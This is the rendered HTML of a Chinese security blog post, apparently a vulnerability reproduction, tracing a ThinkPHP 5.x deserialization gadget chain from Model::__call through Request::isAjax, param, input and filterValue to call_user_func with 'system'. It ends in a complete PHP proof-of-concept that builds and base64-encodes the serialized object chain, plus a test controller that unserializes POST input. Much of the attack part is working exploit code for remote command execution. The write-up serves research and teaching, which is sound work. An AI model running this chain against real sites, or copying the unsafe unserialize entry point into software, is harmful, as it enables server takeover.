+<li>找到<code>param</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 获取当前请求的参数
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @param  mixed         $name 变量名
+</span><span class="sd">     * @param  mixed         $default 默认值
+</span><span class="sd">     * @param  string|array  $filter 过滤方法
+</span><span class="sd">     * @return mixed
+</span><span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">param</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="p">{</span>
+       <span class="o">...</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="k">true</span> <span class="o">===</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// 获取包含文件上传信息的数组
+</span><span class="c1"></span>            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">();</span>
+            <span class="nv">$data</span> <span class="o">=</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">?</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">param</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">param</span><span class="p">;</span>
+
+            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">param</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div><p>会调用<code>input</code>，发现<code>$this-&gt;param</code>我们是可控的，但是<code>$filter</code>和<code>$name</code>不明确，继续往上找。</p>
+<ul>
+<li>找到<code>isAjax</code>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 当前是否Ajax请求
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @param  bool $ajax  true 获取原始ajax请求
+</span><span class="sd">     * @return bool
+</span><span class="sd">     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">isAjax</span><span class="p">(</span><span class="nv">$ajax</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$value</span>  <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="p">(</span><span class="s1">&#39;HTTP_X_REQUESTED_WITH&#39;</span><span class="p">);</span>
+        <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;xmlhttprequest&#39;</span> <span class="o">==</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">?</span> <span class="k">true</span> <span class="o">:</span> <span class="k">false</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="k">true</span> <span class="o">===</span> <span class="nv">$ajax</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nv">$result</span>           <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">param</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="p">[</span><span class="s1">&#39;var_ajax&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="k">true</span> <span class="o">:</span> <span class="nv">$result</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mergeParam</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>会调用<code>param</code>，且通过<code>$this-&gt;config['var_ajax']</code>给param函数的<code>$name</code>参数赋值，且<code>$this-&gt;config['var_ajax']</code>我们可控，分析一下赋值后的执行流程：</p>
+<p>在param函数中name参数被赋值后且不是true，会调用<code>$this-&gt;input($this-&gt;param, $name, $default, $filter);</code>，即<code>input</code>函数第二个参数name被赋值且第一个参数<code>$this-&gt;param</code>我们可控；在input函数中存在如下调用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getData</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+<span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFilter</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$default</span><span class="p">);</span>
+<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterValue</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+</code></pre></div><ul>
+<li>跟进<code>getData</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
+</span><span class="sd">     * 获取数据
+</span><span class="sd">     * @access public
+</span><span class="sd">     * @param  array         $data 数据源
+</span><span class="sd">     * @param  string|false  $name 字段名
+</span><span class="sd">     * @return mixed
+</span><span class="sd">     */</span>
+    <span class="k">protected</span> <span class="k">function</span> <span class="nf">getData</span><span class="p">(</span><span class="k">array</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="nv">$val</span><span class="p">]))</span> <span class="p">{</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nv">$val</span><span class="p">];</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>该函数的<code>$data</code>参数是由<code>$this-&gt;param</code>可控，<code>$name</code>参数来自于<code>$this-&gt;config['var_ajax']</code>，返回值是这样进行赋值<code>$data = $data[$val]</code>，即最终的返回值我们可控，也就是input函数中的<code>$data</code>可控，那么<code>$this-&gt;filterValue</code>函数的data参数也就可控，现在就差<code>$filter</code>是否可控。</p>
+<ul>
+<li>跟进<code>getFilter</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">getFilter</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$default</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$filter</span> <span class="o">=</span> <span class="p">[];</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$filter</span> <span class="o">?:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$filter</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">false</span> <span class="o">===</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$filter</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$filter</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$filter</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="nv">$filter</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$default</span><span class="p">;</span>
+
+        <span class="k">return</span> <span class="nv">$filter</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>发现返回的<code>filter</code>值来自于<code>$this-&gt;filter</code>，也就是可控的。</p>
+<ul>
+<li>综上，对于filterValue函数来说，其参数<code>value</code>可控，<code>filter</code>可控，那么其中所调用的<code>call_user_func($filter, $value)</code>也就完全可控。从而执行恶意代码。</li>
+</ul>
+<blockquote>
+<p>过程中提到input函数中<code>$this-&gt;param</code>这个值，虽然我们可以通过类属性控制它，但是发现可以在GET请求中加入参数对其进行赋值，进行个简单测试：</p>
+<pre tabindex="0"><code>&lt;?php
+namespace app\index\controller;
+
+use think\Request;
+class Index
+{
+    public function index(Request $request)
+    {
+        var_dump($request-&gt;param());
+        return 'haha';
+    }
+
+    public function hello($name = 'ThinkPHP5')
+    {
+        return 'hello,' . $name;
+    }
+}
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 424; 
+			flex-basis: 1019px"
+	>
+	<a href="/p/php-5/image-20220222183619109.png" data-size="535x126">
+		<img src="/p/php-5/image-20220222183619109.png"
+			width="535"
+			height="126"
+			srcset="/p/php-5/image-20220222183619109_hu1a0559a29f950b82acdc5f463b5fbd43_10393_480x0_resize_box_3.png 480w, /p/php-5/image-20220222183619109_hu1a0559a29f950b82acdc5f463b5fbd43_10393_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</blockquote>
+<ul>
+<li>梳理执行链：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1"># Model类__call方法，令$this-&gt;hook = [&#34;visible&#34;=&gt;[$this,&#34;isAjax&#34;]]；调用this-&gt;isAjax方法，经上面分析，this-&gt;isAjax方法对参数无要求，所以哪怕在$args头插入this也无所谓了。
+</span><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hook</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">array_unshift</span><span class="p">(</span><span class="nv">$args</span><span class="p">,</span> <span class="nv">$this</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">call_user_func_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hook</span><span class="p">[</span><span class="nv">$method</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>
+       
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="c1"># 触发调用isAjax函数，令$this-&gt;config[&#39;var_ajax&#39;]=&#39;haha&#39;
+</span><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">isAjax</span><span class="p">(</span><span class="nv">$ajax</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">param</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">config</span><span class="p">[</span><span class="s1">&#39;var_ajax&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="k">true</span> <span class="o">:</span> <span class="nv">$result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1"># 调用param函数，name=$this-&gt;config[&#39;var_ajax&#39;]=&#39;haha&#39;;$this-&gt;param为GET请求传入的参数;filter暂时未知
+</span><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">param</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">param</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$default</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1"># 调用input函数，data=外部传入，{[&#39;haha&#39;]=&gt;&#39;ls&#39;};name=$this-&gt;config[&#39;var_ajax&#39;]=&#39;haha&#39;;filter经过$this-&gt;getFilter($filter, $default)函数是filter=[0=&gt;&#39;system&#39;,1=&gt;$default]；
+</span><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">input</span><span class="p">(</span><span class="nv">$data</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getData</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+    <span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFilter</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$default</span><span class="p">);</span><span class="c1">// 经过该函数filter=[0=&gt;&#39;system&#39;,1=&gt;$default]
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span><span class="c1">// data通过getData函数后不再是数组，data=’ls‘
+</span><span class="c1"></span>        <span class="nx">array_walk_recursive</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="p">[</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;filterValue&#39;</span><span class="p">],</span> <span class="nv">$filter</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">&#39;7.1.0&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arrayReset</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterValue</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># 调用filterValue函数，value=’ls‘;key=’haha‘这个函数里最后没用到；filters=[0=&gt;&#39;system&#39;,1=&gt;$default]
+</span><span class="c1"></span><span class="k">private</span> <span class="k">function</span> <span class="nf">filterValue</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$filters</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$default</span> <span class="o">=</span> <span class="nx">array_pop</span><span class="p">(</span><span class="nv">$filters</span><span class="p">);</span><span class="c1">//[0=&gt;&#39;system&#39;,1=&gt;$default]pop完之后，filters=[0=&gt;&#39;system&#39;]
+</span><span class="c1"></span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filters</span> <span class="k">as</span> <span class="nv">$filter</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">is_callable</span><span class="p">(</span><span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
+            
+            <span class="nv">$value</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1"># 调用call_user_func，filter=’system‘,value=&#39;ls&#39;
+</span></code></pre></div><h2 id="poc">POC</h2>
+<p>Model是一个抽象类，想要实例化，必须找到一个它的实现类，全局搜索<code>extends Model</code>，找到Pivot类：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 270; 
+			flex-basis: 649px"
+	>
+	<a href="/p/php-5/image-20220222200257638.png" data-size="311x115">
+		<img src="/p/php-5/image-20220222200257638.png"
+			width="311"
+			height="115"
+			srcset="/p/php-5/image-20220222200257638_huce7f8596bcb989b06728d71e64c761ff_7855_480x0_resize_box_3.png 480w, /p/php-5/image-20220222200257638_huce7f8596bcb989b06728d71e64c761ff_7855_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
+<span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">private</span> <span class="nv">$data</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;haha&#34;</span><span class="o">=&gt;</span><span class="p">[]];</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;haha&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">Request</span><span class="p">()];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">Request</span>
+<span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$hook</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">protected</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;system&#34;</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s1">&#39;var_ajax&#39;</span>         <span class="o">=&gt;</span> <span class="s1">&#39;haha&#39;</span><span class="p">,</span>  
+    <span class="p">];</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter</span> <span class="o">=</span> <span class="s2">&#34;system&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hook</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;visible&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="nv">$this</span><span class="p">,</span><span class="s2">&#34;isAjax&#34;</span><span class="p">]];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="k">namespace</span> <span class="nx">think\process\pipes</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nx">think\model\concern\Conversion</span><span class="p">;</span>
+<span class="k">use</span> <span class="nx">think\model\Pivot</span><span class="p">;</span>
+<span class="k">class</span> <span class="nc">Windows</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$files</span> <span class="o">=</span> <span class="p">[];</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="o">=</span><span class="p">[</span><span class="k">new</span> <span class="nx">Pivot</span><span class="p">()];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nx">think\Model</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">Pivot</span> <span class="k">extends</span> <span class="nx">Model</span>
+<span class="p">{</span>
+<span class="p">}</span>
+<span class="k">use</span> <span class="nx">think\process\pipes\Windows</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Windows</span><span class="p">()));</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p><strong>测试页代码构造一个反序列化入口：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">()</span>
+<span class="p">{</span>
+
+    <span class="nv">$test</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+    <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$test</span><span class="p">));</span>
+    <span class="k">return</span> <span class="s1">&#39;haha&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p><strong>利用：</strong></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 643; 
+			flex-basis: 1545px"
+	>
+	<a href="/p/php-5/image-20220222211115983.png" data-size="1230x191">
+		<img src="/p/php-5/image-20220222211115983.png"
+			width="1230"
+			height="191"
+			srcset="/p/php-5/image-20220222211115983_hu7fe8c1d5542f32a3a9880f7452a20aee_35974_480x0_resize_box_3.png 480w, /p/php-5/image-20220222211115983_hu7fe8c1d5542f32a3a9880f7452a20aee_35974_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/%E5%A4%8D%E7%8E%B0-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post pkexec 本地提权"
+                        data-key="复现-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">pkexec 本地提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/%E5%A4%8D%E7%8E%B0-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%A4%8D%E7%8E%B0-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Activemq 任意文件写入漏洞"
+                        data-key="复现-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Activemq 任意文件写入漏洞</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#环境">环境</a></li>
+    <li><a href="#反序列化触发链">反序列化触发链</a></li>
+    <li><a href="#敏感函数执行链">敏感函数执行链</a></li>
+    <li><a href="#poc">POC</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
